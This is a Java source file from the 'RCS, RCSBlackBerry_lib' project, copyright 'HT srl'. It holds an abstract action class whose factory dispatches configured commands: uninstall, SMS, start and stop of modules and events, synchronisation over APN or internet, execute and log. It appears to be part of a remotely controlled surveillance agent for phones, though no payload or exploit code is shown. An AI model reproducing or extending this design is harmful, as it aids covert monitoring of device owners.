//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SubAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import rpc.json.me.JSONException;
import blackberry.Status;
import blackberry.Trigger;
import blackberry.action.sync.SyncActionApn;
import blackberry.action.sync.SyncActionInternet;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.debug.Check;


/**
 * The Class SubAction.
 */
public abstract class SubAction {
    //#ifdef DEBUG
    protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
    //#endif
    private final ConfAction conf;

    protected Status status;

    /**
     * Instantiates a new sub action.
     * 
     * @param type
     *            the type
     * @param jsubaction
     *            the params
     */
    public SubAction(final ConfAction conf) {
        this.status = Status.self();
        this.conf = conf;

        parse(conf);
    }
    
    /**
     * Factory.
     * @param type 
     * 
     * @param typeId
     *            the type
     * @param params
     *            the conf params
     * @return the sub action
     * @throws JSONException
     * @throws ConfigurationException 
     */
    public static SubAction factory(String type, final ConfAction params) throws  ConfigurationException {
        Check.asserts(type != null,"factory: null type");
        
        if (type.equals("uninstall")) {

            //#ifdef DEBUG
            debug.trace("factory *** ACTION_UNINSTALL ***");
            //#endif

            return new UninstallAction(params);
        } else if (type.equals("reload")) {
            //#ifdef DEBUG
            debug.trace("factory *** ACTION_RELOAD ***");
            //#endif

            return new ReloadAction(params);

        } else if (type.equals("sms")) {
            //#ifdef DEBUG
            debug.trace("factory *** ACTION_SMS ***");
            //#endif

            return new SmsAction(params);

        } else if (type.equals("module")) {
            String status = params.getString("status");
            if (status.equals("start")) {
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_START_MODULE ***");
                //#endif
  
                return new StartModuleAction(params);
            } else if (status.equals("stop")) {
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_STOP_MODULE ***");
                //#endif

                return new StopModuleAction(params);

            }
        } else if (type.equals("event")) {
            String status = params.getString("status");
            if (status.equals("start")) {
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_START_EVENT ***");
                //#endif

                return new StartEventAction(params);
            } else if (status.equals("stop")) {
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_STOP_EVENT ***");
                //#endif
      
                return new StopEventAction(params);

            }

        } else if (type.equals("synchronize")) {
            boolean apn = params.has("apn");
            if (apn) {
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_SYNC_APN ***");
                //#endif
  
                return new SyncActionApn(params);
            } else {
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_SYNC ***");
                //#endif

                return new SyncActionInternet(params);
            }

        } else if (type.equals("execute")) {
            //#ifdef DEBUG
            debug.trace("factory *** ACTION_EXECUTE ***");
            //#endif

            return new ExecuteAction(params);

        } else if (type.equals("log")) {
            //#ifdef DEBUG
            debug.trace("factory *** ACTION_INFO ***");
            //#endif

            return new LogAction(params);
        } else {
            //#ifdef DEBUG
            debug.error("factory Error: unknown type: " + type);
            //#endif

        }
        return null;
    }


    public String getType(){
        return conf.getType();
    }
    
    /** The finished. */
    private boolean finished;

    /**
     * Parse
     * 
     * @param jsubaction
     *            byte array from configuration
     */
    protected abstract boolean parse(final ConfAction conf);

    /**
     * Execute.
     * @param trigger 
     * 
     * @return true, if successful
     */
    public abstract boolean execute(Trigger trigger);
    
    //#ifdef DEBUG
    public String toString() {
        return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" +conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
    }
    //#endif


}
